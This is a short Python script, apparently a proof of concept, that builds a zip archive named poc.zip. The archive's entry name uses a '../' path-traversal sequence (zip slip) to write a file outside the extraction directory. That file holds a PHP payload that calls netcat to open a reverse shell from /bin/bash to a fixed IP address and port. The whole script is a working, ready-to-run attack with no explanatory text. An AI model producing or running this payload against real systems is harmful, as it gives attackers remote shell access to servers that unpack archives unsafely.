#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def _build_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../../home/whatever/my_reverse_shell', '<?php shell_exec("nc -e /bin/bash 192.168.1.42 4444"); ?>')
    z.close()
    zip = open('poc.zip', 'wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()

